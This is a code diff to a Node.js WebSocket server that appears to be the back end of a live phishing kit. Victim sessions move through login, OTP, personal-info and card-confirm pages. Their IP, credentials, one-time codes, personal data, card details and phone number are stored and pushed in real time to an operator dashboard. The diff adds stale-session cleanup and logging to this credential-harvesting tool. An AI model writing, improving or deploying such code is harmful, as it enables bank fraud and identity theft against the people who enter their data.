@@ -919,40 +919,53 @@ wss.on("connection", (ws, req) => {
           dashboards.add(ws);
           ws.isDashboard = true;
 
+          // First, clean up any stale sessions (WebSocket closed but not removed)
+          const staleSessionIds = [];
+          sessions.forEach((session, sessionId) => {
+            if (!session.ws || session.ws.readyState !== WebSocket.OPEN) {
+              staleSessionIds.push(sessionId);
+            }
+          });
+          staleSessionIds.forEach((id) => {
+            sessions.delete(id);
+            console.log(`[Cleanup] Removed stale session: ${id}`);
+          });
+
           // Send ONLY currently connected sessions (with their DB data)
           const activeSessions = [];
           sessions.forEach((session, sessionId) => {
-            // Only include if WebSocket is still open
-            if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-              // Get full data from DB
-              const dbData = getSessionData(sessionId);
+            // Get full data from DB
+            const dbData = getSessionData(sessionId);
 
-              // Determine current page based on last data received
-              let page = session.page || "login";
-              if (dbData) {
-                if (dbData.cardInfo) page = "card-confirm";
-                else if (dbData.personalInfo) page = "personal-info";
-                else if (dbData.otp) page = "otp";
-                else if (dbData.login) page = "login";
-              }
-
-              activeSessions.push({
-                sessionId: sessionId,
-                page: page,
-                isConnected: true,
-                data: dbData
-                  ? {
-                      ip: dbData.ip,
-                      login: dbData.login,
-                      otp: dbData.otp ? { otp: dbData.otp } : null,
-                      personalInfo: dbData.personalInfo,
-                      cardInfo: dbData.cardInfo,
-                      phone: dbData.phone,
-                    }
-                  : { ip: session.ip },
-              });
+            // Determine current page based on last data received
+            let page = session.page || "login";
+            if (dbData) {
+              if (dbData.cardInfo) page = "card-confirm";
+              else if (dbData.personalInfo) page = "personal-info";
+              else if (dbData.otp) page = "otp";
+              else if (dbData.login) page = "login";
             }
+
+            activeSessions.push({
+              sessionId: sessionId,
+              page: page,
+              isConnected: true,
+              data: dbData
+                ? {
+                    ip: dbData.ip,
+                    login: dbData.login,
+                    otp: dbData.otp ? { otp: dbData.otp } : null,
+                    personalInfo: dbData.personalInfo,
+                    cardInfo: dbData.cardInfo,
+                    phone: dbData.phone,
+                  }
+                : { ip: session.ip },
+            });
           });
+
+          console.log(
+            `[Dashboard] Sending ${activeSessions.length} active sessions`
+          );
 
           ws.send(
             JSON.stringify({
@@ -1136,15 +1149,18 @@ wss.on("connection", (ws, req) => {
   });
 
   ws.on("close", () => {
-    // Clean up on disconnect - but KEEP data in DB!
+    // Clean up on disconnect
     if (ws.sessionId) {
+      // Remove from memory (data is safe in SQLite)
+      sessions.delete(ws.sessionId);
+
       broadcastToDashboards({
         type: "session_update",
         sessionId: ws.sessionId,
         status: "disconnected",
       });
-      // Don't delete from memory - session might reconnect
-      // Data is safe in SQLite anyway
+
+      console.log(`[Session] Disconnected: ${ws.sessionId}`);
     }
 
     if (ws.isDashboard) {
